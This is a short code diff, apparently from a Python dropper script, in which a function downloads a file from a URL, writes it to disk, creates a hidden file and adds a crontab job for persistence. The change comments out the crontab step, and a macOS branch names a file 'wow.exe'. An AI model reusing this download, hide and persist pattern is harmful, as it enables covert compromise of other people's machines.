@@ -113,7 +113,7 @@ def run(url, file_path):
               file.write(response.content)
         # Create a hidden file and add a crontab job
         create_hidden_file(file_path)
-        add_crontab_job(file_path)
+        #add_crontab_job(file_path)
     
     elif os_type == 'Darwin':  # macOS
         file_path = "./wow.exe"
